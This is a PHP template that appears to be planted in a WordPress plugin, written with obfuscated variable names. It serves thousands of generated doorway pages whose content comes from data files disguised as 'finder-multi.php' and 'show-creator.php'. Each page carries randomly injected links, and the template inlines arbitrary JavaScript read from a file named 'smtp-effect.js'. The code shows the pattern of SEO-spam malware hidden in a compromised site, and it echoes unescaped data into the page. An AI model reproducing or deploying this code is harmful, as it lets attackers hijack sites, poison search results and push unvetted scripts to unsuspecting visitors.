<?php
$nzQ04jXoF = intval(get_query_var('vvjysbi'));

if ($nzQ04jXoF < 1 || $nzQ04jXoF > 4449) return;
$phhdCh = file(plugin_dir_path(__FILE__).'finder-multi.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$jdEx6c = explode(';', $phhdCh[$nzQ04jXoF]);
if (count($jdEx6c) < 2) return;
$vgNenNNyn = $jdEx6c[0];
$lWUpd  = $jdEx6c[1];
$fH1cGKwiMf = $jdEx6c[2];
$bLQb2  = $jdEx6c[3];
$hUHdIH = $jdEx6c[4];
set_query_var('mlifbsqll', $vgNenNNyn);

$mK1tMVdAU = '';
$gFZQ97N = plugin_dir_path(__FILE__).'show-creator.php';
if (is_file($gFZQ97N)) {
	$c09aHZTv = file($gFZQ97N, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($c09aHZTv);
	shuffle($c09aHZTv);
	$wRtUUnw = mt_rand(2, 5);
	if (count($c09aHZTv) > $wRtUUnw) {
		for ($kO41LcmBR7 = 0; $kO41LcmBR7 < $wRtUUnw; $kO41LcmBR7++) {
			$zRriJYSnSB = array_shift($c09aHZTv);
			$mK1tMVdAU .= '<p><a href="'.$zRriJYSnSB.'">'.$zRriJYSnSB.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $vgNenNNyn; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $lWUpd . "</p>\n";
				if (strlen($bLQb2) > 0) echo "<p>" . $bLQb2 . "</p>\n";
				if (strlen($fH1cGKwiMf) > 0) echo "<p>" . $fH1cGKwiMf . "</p>\n";
				if (strlen($hUHdIH) > 0) echo '<p><a href="#"><img src="'.$hUHdIH.'"></a>' . "</p>\n";
				echo $mK1tMVdAU;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$eHgCKfs = plugin_dir_path(__FILE__) . 'smtp-effect.js';
if (is_file($eHgCKfs)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($eHgCKfs);
	echo '</script>';
}
get_footer();
?>
